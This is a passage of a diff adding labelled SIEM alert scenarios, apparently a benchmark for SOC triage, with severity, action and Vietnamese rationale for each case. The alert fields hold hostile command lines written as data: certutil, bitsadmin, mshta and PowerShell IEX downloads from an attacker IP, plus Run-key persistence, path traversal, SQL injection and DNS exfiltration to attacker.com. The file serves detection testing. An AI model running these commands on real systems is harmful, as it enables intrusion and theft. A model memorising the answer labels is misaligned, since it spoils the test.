+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6124",
+            "ParentProcessId": "6120"
+          }
+        },
+        {
+          "alert_id": "v2-041:e5",
+          "rule_name": "Security Privileges Enumeration Via Whoami.EXE",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1033"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:46:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Security Privileges Enumeration Via Whoami.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\whoami.exe",
+            "OriginalFileName": "whoami.exe",
+            "CommandLine": "whoami.exe /priv",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6124",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "critical",
+        "attack_ids": [
+          "T1033"
+        ],
+        "correct_action": "block",
+        "siem_correct": false,
+        "reason": "5 lần whoami /priv từ IIS APPPOOL trong 2 phút — trinh sát chủ động. Rule B16 chỉ gán high cho 1 alert; chuỗi lặp = critical."
+      }
+    },
+    {
+      "id": "v2-042",
+      "name": "3 certutil download liên tiếp",
+      "alerts": [
+        {
+          "alert_id": "v2-042:e1",
+          "rule_name": "Suspicious Download Via Certutil.EXE",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1027",
+            "T1105"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:47:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Suspicious Download Via Certutil.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\certutil.exe",
+            "OriginalFileName": "CertUtil.exe",
+            "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.45/a.exe C:\\temp\\a.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6220",
+            "ParentProcessId": "6120"
+          }
+        },
+        {
+          "alert_id": "v2-042:e2",
+          "rule_name": "Suspicious Download Via Certutil.EXE",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1027",
+            "T1105"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:47:30Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Suspicious Download Via Certutil.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\certutil.exe",
+            "OriginalFileName": "CertUtil.exe",
+            "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.45/b.exe C:\\temp\\b.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6220",
+            "ParentProcessId": "6120"
+          }
+        },
+        {
+          "alert_id": "v2-042:e3",
+          "rule_name": "Suspicious Download Via Certutil.EXE",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1027",
+            "T1105"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:48:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Suspicious Download Via Certutil.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\certutil.exe",
+            "OriginalFileName": "CertUtil.exe",
+            "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.45/c.exe C:\\temp\\c.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6220",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1027",
+          "T1105"
+        ],
+        "correct_action": "block",
+        "siem_correct": false,
+        "reason": "3 lần tải file khác nhau từ cùng IP trong 1 phút — staging. Rule B12 medium; hành vi lặp + staging → high."
+      }
+    },
+    {
+      "id": "v2-043",
+      "name": "Chuỗi schtasks + PS encoded + Run key",
+      "alerts": [
+        {
+          "alert_id": "v2-043:e1",
+          "rule_name": "Scheduled Task Creation Via Schtasks.EXE",
+          "rule_level": "low",
+          "attack_ids": [
+            "T1053.005"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:49:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Scheduled Task Creation Via Schtasks.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "CommandLine": "schtasks.exe /create /tn Updater /tr C:\\temp\\upd.exe /sc onlogon",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6127",
+            "ParentProcessId": "6120"
+          }
+        },
+        {
+          "alert_id": "v2-043:e2",
+          "rule_name": "Suspicious Encoded PowerShell Command Line",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1059.001"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:49:30Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Suspicious Encoded PowerShell Command Line |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "OriginalFileName": "PowerShell.EXE",
+            "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgA",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6444",
+            "ParentProcessId": "6120"
+          }
+        },
+        {
+          "alert_id": "v2-043:e3",
+          "rule_name": "Potential Persistence Attempt Via Run Keys Using Reg.EXE",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1547.001"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:50:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Potential Persistence Attempt Via Run Keys Using Reg.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\reg.exe",
+            "CommandLine": "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v X /d C:\\temp\\x.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6129",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "critical",
+        "attack_ids": [
+          "T1053.005",
+          "T1059.001",
+          "T1547.001"
+        ],
+        "correct_action": "block",
+        "siem_correct": false,
+        "reason": "3 kỹ thuật persistence liên tiếp trong 1 phút — kẻ tấn công đang cài chân. Mỗi rule đơn lẻ low/medium; chuỗi = critical."
+      }
+    },
+    {
+      "id": "v2-044",
+      "name": "Chuỗi systeminfo → whoami /priv → net user",
+      "alerts": [
+        {
+          "alert_id": "v2-044:e1",
+          "rule_name": "Suspicious Execution of Systeminfo",
+          "rule_level": "low",
+          "attack_ids": [
+            "T1082"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:51:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Suspicious Execution of Systeminfo |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\systeminfo.exe",
+            "OriginalFileName": "sysinfo.exe",
+            "CommandLine": "systeminfo.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6125",
+            "ParentProcessId": "6120"
+          }
+        },
+        {
+          "alert_id": "v2-044:e2",
+          "rule_name": "Security Privileges Enumeration Via Whoami.EXE",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1033"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:51:30Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Security Privileges Enumeration Via Whoami.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\whoami.exe",
+            "OriginalFileName": "whoami.exe",
+            "CommandLine": "whoami.exe /priv",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6124",
+            "ParentProcessId": "6120"
+          }
+        },
+        {
+          "alert_id": "v2-044:e3",
+          "rule_name": "Webshell Detection With Command Line Keywords",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1505.003",
+            "T1018",
+            "T1033",
+            "T1087"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:52:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Webshell Detection With Command Line Keywords |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+            "Image": "C:\\Windows\\System32\\net.exe",
+            "OriginalFileName": "net.exe",
+            "CommandLine": "net user /domain",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6121",
+            "ParentProcessId": "4892"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "critical",
+        "attack_ids": [
+          "T1082",
+          "T1033",
+          "T1087"
+        ],
+        "correct_action": "block",
+        "siem_correct": false,
+        "reason": "Discovery liên tiếp: systeminfo (low) + whoami (high) + net user (high) từ cùng ngữ cảnh webshell. Chuỗi = critical."
+      }
+    },
+    {
+      "id": "v2-045",
+      "name": "3 alert DNS b64 trong 1 phút",
+      "alerts": [
+        {
+          "alert_id": "v2-045:n1",
+          "rule_name": "Suspicious DNS Query with B64 Encoded String",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1048.003",
+            "T1071.004"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:53:00Z",
+          "src_ip": "192.168.56.20",
+          "dest_ip": "8.8.8.8",
+          "dest_port": 53,
+          "host": "sensor-net-01",
+          "summary": "Suspicious DNS Query with B64 Encoded String | 192.168.56.20 -> 8.8.8.8:53 | host=sensor-net-01",
+          "fields": {
+            "event_type": "dns",
+            "proto": "UDP",
+            "app_proto": "dns",
+            "query": "cGF5bG9hZDE=.attacker.com",
+            "flow": {
+              "pkts_toserver": 5,
+              "pkts_toclient": 5,
+              "bytes_toserver": 400,
+              "bytes_toclient": 600,
+              "start": "2026-09-27T01:53:00Z",
+              "end": "2026-09-27T01:53:00Z"
+            }
+          }
+        },
+        {
+          "alert_id": "v2-045:n2",
+          "rule_name": "Suspicious DNS Query with B64 Encoded String",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1048.003",
+            "T1071.004"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:53:30Z",
+          "src_ip": "192.168.56.20",
+          "dest_ip": "8.8.8.8",
+          "dest_port": 53,
+          "host": "sensor-net-01",
+          "summary": "Suspicious DNS Query with B64 Encoded String | 192.168.56.20 -> 8.8.8.8:53 | host=sensor-net-01",
+          "fields": {
+            "event_type": "dns",
+            "proto": "UDP",
+            "app_proto": "dns",
+            "query": "cGF5bG9hZDI=.attacker.com",
+            "flow": {
+              "pkts_toserver": 5,
+              "pkts_toclient": 5,
+              "bytes_toserver": 400,
+              "bytes_toclient": 600,
+              "start": "2026-09-27T01:53:30Z",
+              "end": "2026-09-27T01:53:30Z"
+            }
+          }
+        },
+        {
+          "alert_id": "v2-045:n3",
+          "rule_name": "Suspicious DNS Query with B64 Encoded String",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1048.003",
+            "T1071.004"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:54:00Z",
+          "src_ip": "192.168.56.20",
+          "dest_ip": "8.8.8.8",
+          "dest_port": 53,
+          "host": "sensor-net-01",
+          "summary": "Suspicious DNS Query with B64 Encoded String | 192.168.56.20 -> 8.8.8.8:53 | host=sensor-net-01",
+          "fields": {
+            "event_type": "dns",
+            "proto": "UDP",
+            "app_proto": "dns",
+            "query": "cGF5bG9hZDM=.attacker.com",
+            "flow": {
+              "pkts_toserver": 5,
+              "pkts_toclient": 5,
+              "bytes_toserver": 400,
+              "bytes_toclient": 600,
+              "start": "2026-09-27T01:54:00Z",
+              "end": "2026-09-27T01:54:00Z"
+            }
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1048.003",
+          "T1071.004"
+        ],
+        "correct_action": "block",
+        "siem_correct": false,
+        "reason": "3 DNS query b64 khác nhau trong 1 phút — tunneling đang chạy. Rule B23 medium cho 1 alert; chuỗi lặp = high."
+      }
+    },
+    {
+      "id": "v2-046",
+      "name": "2 alert B05 liên tiếp (webshell tải 2 shell)",
+      "alerts": [
+        {
+          "alert_id": "v2-046:e1",
+          "rule_name": "Suspicious Process By Web Server Process",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1505.003",
+            "T1190"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:55:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Suspicious Process By Web Server Process |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+            "ParentCommandLine": "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap DefaultAppPool",
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "cmd.exe /c whoami",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6120",
+            "ParentProcessId": "4892"
+          }
+        },
+        {
+          "alert_id": "v2-046:e2",
+          "rule_name": "Suspicious Process By Web Server Process",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1505.003",
+            "T1190"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:55:30Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Suspicious Process By Web Server Process |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "ParentImage": "C:\\Windows\\System32\\inetsrv\\w3wp.exe",
+            "ParentCommandLine": "c:\\windows\\system32\\inetsrv\\w3wp.exe -ap DefaultAppPool",
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "cmd.exe /c ipconfig",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6120",
+            "ParentProcessId": "4892"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "critical",
+        "attack_ids": [
+          "T1505.003",
+          "T1190"
+        ],
+        "correct_action": "block",
+        "siem_correct": false,
+        "reason": "w3wp sinh 2 lệnh khác nhau (whoami + ipconfig) trong 1 phút — webshell hoạt động. Rule B05 high cho 1; chuỗi = critical."
+      }
+    },
+    {
+      "id": "v2-047",
+      "name": "PowerShell encoded + download pattern",
+      "alerts": [
+        {
+          "alert_id": "v2-047:e1",
+          "rule_name": "Suspicious Encoded PowerShell Command Line",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1059.001"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:56:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Suspicious Encoded PowerShell Command Line |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "OriginalFileName": "PowerShell.EXE",
+            "CommandLine": "powershell.exe -nop -w hidden -enc SQBFAFgA",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6444",
+            "ParentProcessId": "6120"
+          }
+        },
+        {
+          "alert_id": "v2-047:e2",
+          "rule_name": "Suspicious PowerShell Download and Execute Pattern",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1059.001"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:56:30Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Suspicious PowerShell Download and Execute Pattern |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe IEX (New-Object Net.WebClient).DownloadString('http://203.0.113.45/p.ps1')",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6446",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "critical",
+        "attack_ids": [
+          "T1059.001"
+        ],
+        "correct_action": "block",
+        "siem_correct": false,
+        "reason": "PS encoded + IEX DownloadString trong 1 phút — stager 2 giai đoạn. Mỗi rule high; chuỗi = critical."
+      }
+    },
+    {
+      "id": "v2-048",
+      "name": "3 LOLBAS khác nhau trong 1 phút",
+      "alerts": [
+        {
+          "alert_id": "v2-048:e1",
+          "rule_name": "Suspicious Download Via Certutil.EXE",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1027",
+            "T1105"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:57:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Suspicious Download Via Certutil.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\certutil.exe",
+            "OriginalFileName": "CertUtil.exe",
+            "CommandLine": "certutil.exe -urlcache -split -f http://203.0.113.45/p.exe C:\\temp\\p.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6220",
+            "ParentProcessId": "6120"
+          }
+        },
+        {
+          "alert_id": "v2-048:e2",
+          "rule_name": "Remotely Hosted HTA File Executed Via Mshta.EXE",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1218.005"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:57:30Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Remotely Hosted HTA File Executed Via Mshta.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\mshta.exe",
+            "OriginalFileName": "MSHTA.EXE",
+            "CommandLine": "mshta.exe http://203.0.113.45/payload.hta",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6223",
+            "ParentProcessId": "6120"
+          }
+        },
+        {
+          "alert_id": "v2-048:e3",
+          "rule_name": "File Download Via Bitsadmin",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1197",
+            "T1036.003",
+            "T1105"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:58:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "File Download Via Bitsadmin |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\bitsadmin.exe",
+            "OriginalFileName": "bitsadmin.exe",
+            "CommandLine": "bitsadmin /transfer job http://203.0.113.45/p.exe C:\\temp\\p.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6222",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "critical",
+        "attack_ids": [
+          "T1027",
+          "T1105",
+          "T1218.005",
+          "T1197"
+        ],
+        "correct_action": "block",
+        "siem_correct": false,
+        "reason": "3 LOLBAS khác nhau tải/chạy file trong 1 phút — chaining. Chuỗi = critical."
+      }
+    },
+    {
+      "id": "v2-049",
+      "name": "Path traversal + SQLi cùng IP",
+      "alerts": [
+        {
+          "alert_id": "v2-049:w1",
+          "rule_name": "Path Traversal Exploitation Attempts",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1190"
+          ],
+          "surface": "web",
+          "timestamp": "2026-09-27T01:59:00Z",
+          "src_ip": "203.0.113.99",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 80,
+          "host": "proxy01",
+          "summary": "Path Traversal Exploitation Attempts | 203.0.113.99 -> 192.168.56.20:80 | host=proxy01",
+          "fields": {
+            "method": "GET",
+            "uri": "/download?file=../../../../../etc/passwd",
+            "status": "200",
+            "http_user_agent": "Mozilla/5.0",
+            "http_host": "192.168.56.20",
+            "http_referer": "",
+            "body_bytes_sent": "896"
+          }
+        },
+        {
+          "alert_id": "v2-049:w2",
+          "rule_name": "SQL Injection Strings In URI",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1190"
+          ],
+          "surface": "web",
+          "timestamp": "2026-09-27T01:59:30Z",
+          "src_ip": "203.0.113.99",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 80,
+          "host": "proxy01",
+          "summary": "SQL Injection Strings In URI | 203.0.113.99 -> 192.168.56.20:80 | host=proxy01",
+          "fields": {
+            "method": "GET",
+            "uri": "/dvwa/?id=1%27+OR+%271%27%3D%271",
+            "status": "200",
+            "http_user_agent": "sqlmap/1.7.2",
+            "http_host": "192.168.56.20",
+            "http_referer": "",
+            "body_bytes_sent": "896"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "high",
+        "attack_ids": [
+          "T1190"
+        ],
+        "correct_action": "block",
+        "siem_correct": true,
+        "reason": "Path traversal (medium) + SQLi (high) cùng IP trong 1 phút — exploitation đa kỹ thuật. Rule B02 medium; chuỗi = high."
+      }
+    },
+    {
+      "id": "v2-050",
+      "name": "5 DNS query Cobalt Strike liên tiếp",
+      "alerts": [
+        {
+          "alert_id": "v2-050:n1",
+          "rule_name": "Cobalt Strike DNS Beaconing",
+          "rule_level": "critical",
+          "attack_ids": [
+            "T1071.004"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:58:00Z",
+          "src_ip": "192.168.56.20",
+          "dest_ip": "8.8.8.8",
+          "dest_port": 53,
+          "host": "sensor-net-01",
+          "summary": "Cobalt Strike DNS Beaconing | 192.168.56.20 -> 8.8.8.8:53 | host=sensor-net-01",
+          "fields": {
+            "event_type": "dns",
+            "proto": "UDP",
+            "app_proto": "dns",
+            "query": "aaa.stage.attacker.com",
+            "flow": {
+              "pkts_toserver": 50,
+              "pkts_toclient": 50,
+              "bytes_toserver": 5000,
+              "bytes_toclient": 5000,
+              "start": "2026-09-27T01:58:00Z",
+              "end": "2026-09-27T01:58:00Z"
+            }
+          }
+        },
+        {
+          "alert_id": "v2-050:n2",
+          "rule_name": "Cobalt Strike DNS Beaconing",
+          "rule_level": "critical",
+          "attack_ids": [
+            "T1071.004"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:58:30Z",
+          "src_ip": "192.168.56.20",
+          "dest_ip": "8.8.8.8",
+          "dest_port": 53,
+          "host": "sensor-net-01",
+          "summary": "Cobalt Strike DNS Beaconing | 192.168.56.20 -> 8.8.8.8:53 | host=sensor-net-01",
+          "fields": {
+            "event_type": "dns",
+            "proto": "UDP",
+            "app_proto": "dns",
+            "query": "aaa.stage.attacker.com",
+            "flow": {
+              "pkts_toserver": 50,
+              "pkts_toclient": 50,
+              "bytes_toserver": 5000,
+              "bytes_toclient": 5000,
+              "start": "2026-09-27T01:58:30Z",
+              "end": "2026-09-27T01:58:30Z"
+            }
+          }
+        },
+        {
+          "alert_id": "v2-050:n3",
+          "rule_name": "Cobalt Strike DNS Beaconing",
+          "rule_level": "critical",
+          "attack_ids": [
+            "T1071.004"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:59:00Z",
+          "src_ip": "192.168.56.20",
+          "dest_ip": "8.8.8.8",
+          "dest_port": 53,
+          "host": "sensor-net-01",
+          "summary": "Cobalt Strike DNS Beaconing | 192.168.56.20 -> 8.8.8.8:53 | host=sensor-net-01",
+          "fields": {
+            "event_type": "dns",
+            "proto": "UDP",
+            "app_proto": "dns",
+            "query": "post.1.attacker.com",
+            "flow": {
+              "pkts_toserver": 50,
+              "pkts_toclient": 50,
+              "bytes_toserver": 5000,
+              "bytes_toclient": 5000,
+              "start": "2026-09-27T01:59:00Z",
+              "end": "2026-09-27T01:59:00Z"
+            }
+          }
+        },
+        {
+          "alert_id": "v2-050:n4",
+          "rule_name": "Cobalt Strike DNS Beaconing",
+          "rule_level": "critical",
+          "attack_ids": [
+            "T1071.004"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:59:30Z",
+          "src_ip": "192.168.56.20",
+          "dest_ip": "8.8.8.8",
+          "dest_port": 53,
+          "host": "sensor-net-01",
+          "summary": "Cobalt Strike DNS Beaconing | 192.168.56.20 -> 8.8.8.8:53 | host=sensor-net-01",
+          "fields": {
+            "event_type": "dns",
+            "proto": "UDP",
+            "app_proto": "dns",
+            "query": "aaa.stage.attacker.com",
+            "flow": {
+              "pkts_toserver": 50,
+              "pkts_toclient": 50,
+              "bytes_toserver": 5000,
+              "bytes_toclient": 5000,
+              "start": "2026-09-27T01:59:30Z",
+              "end": "2026-09-27T01:59:30Z"
+            }
+          }
+        },
+        {
+          "alert_id": "v2-050:n5",
+          "rule_name": "Cobalt Strike DNS Beaconing",
+          "rule_level": "critical",
+          "attack_ids": [
+            "T1071.004"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T02:00:00Z",
+          "src_ip": "192.168.56.20",
+          "dest_ip": "8.8.8.8",
+          "dest_port": 53,
+          "host": "sensor-net-01",
+          "summary": "Cobalt Strike DNS Beaconing | 192.168.56.20 -> 8.8.8.8:53 | host=sensor-net-01",
+          "fields": {
+            "event_type": "dns",
+            "proto": "UDP",
+            "app_proto": "dns",
+            "query": "aaa.stage.attacker.com",
+            "flow": {
+              "pkts_toserver": 50,
+              "pkts_toclient": 50,
+              "bytes_toserver": 5000,
+              "bytes_toclient": 5000,
+              "start": "2026-09-27T02:00:00Z",
+              "end": "2026-09-27T02:00:00Z"
+            }
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": true,
+        "severity": "critical",
+        "attack_ids": [
+          "T1071.004"
+        ],
+        "correct_action": "block",
+        "siem_correct": true,
+        "reason": "5 DNS beacon Cobalt Strike trong 2 phút — kênh C2 đang hoạt động. Rule B25 đã critical; chuỗi củng cố critical."
+      }
+    },
+    {
+      "id": "v2-051",
+      "name": "Kill-chain đầy đủ: recon → SQLi → webshell → C2",
+      "alerts": [
+        {
+          "alert_id": "v2-051:n1",
+          "rule_name": "AegisSOC - Suricata Network Scan Alert",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1046",
+            "T1595"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:00:00Z",
+          "src_ip": "203.0.113.45",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 445,
+          "host": "sensor-net-01",
+          "summary": "AegisSOC - Suricata Network Scan Alert | 203.0.113.45 -> 192.168.56.20:445 | host=sensor-net-01",
+          "fields": {
+            "event_type": "alert",
+            "proto": "TCP",
+            "app_proto": "failed",
+            "alert": {
+              "signature": "ET SCAN Possible TCP Port Scan",
+              "signature_id": 2001219,
+              "category": "Attempted Information Leak"
+            },
+            "flow": {
+              "pkts_toserver": 1,
+              "pkts_toclient": 0,
+              "bytes_toserver": 60,
+              "bytes_toclient": 0,
+              "start": "2026-09-27T01:00:00Z",
+              "end": "2026-09-27T01:00:00Z"
+            }
+          }
+        },
+        {
+          "alert_id": "v2-051:n2",
+          "rule_name": "AegisSOC - Suricata Network Scan Alert",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1046",
+            "T1595"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:01:00Z",
+          "src_ip": "203.0.113.45",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 22,
+          "host": "sensor-net-01",
+          "summary": "AegisSOC - Suricata Network Scan Alert | 203.0.113.45 -> 192.168.56.20:22 | host=sensor-net-01",
+          "fields": {
+            "event_type": "alert",
+            "proto": "TCP",
+            "app_proto": "failed",
+            "alert": {
+              "signature": "ET SCAN Possible TCP Port Scan",
